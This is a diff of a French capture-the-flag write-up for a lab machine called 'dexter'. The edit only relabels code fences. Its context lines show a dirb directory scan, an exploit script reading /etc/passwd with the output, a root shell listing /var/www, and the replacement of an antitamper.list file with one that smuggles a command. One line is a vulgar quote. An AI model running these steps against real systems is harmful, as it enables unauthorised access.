@@ -165,7 +165,7 @@ On a donc quelques méthodes qui nous serviront par la suite.
 
 Un scan du dossier */Panel/* avec *dirb* révèle d'autres pages web :  
 
-```bash
+```console
 $ ./dirb http://192.168.1.54/Panel/ wordlists/big.txt -X .php
 ---- Scanning URL: http://192.168.1.54/Panel/ ----
 + http://192.168.1.54/Panel/config.php (CODE:200|SIZE:0)                                                                                                                                                      
@@ -360,7 +360,7 @@ print decrypt(data)
 
 Dans la pratique :  
 
-```bash
+```console
 $ python exploit.py /etc/passwd
 $root:x:0:0:root:/root:/bin/bash
 daemon:x:1:1:daemon:/usr/sbin:/bin/sh
@@ -453,7 +453,7 @@ The coroner can suck my uncircumcised dick if he doesn't rule this a homicide
 
 Dans */var/www* il y a des fichiers il y a des fichiers qui ne semblent attendre que nous :  
 
-```bash
+```console
 root@dexter:/var/www# ls -l
 total 16
 -rw-rw-rw- 1 root root  840 Mar 16 18:03 antitamper.list
@@ -514,7 +514,7 @@ Un dièse est placé pour marquer un commentaire bash et une quote est là pour 
 
 Et miracle :  
 
-```bash
+```console
 $ cp antitamper.list /tmp/sav_antitamper.list
 $ cp /tmp/modified_antitamper.list antitamper.list
 $  ls -l Panel/exes/
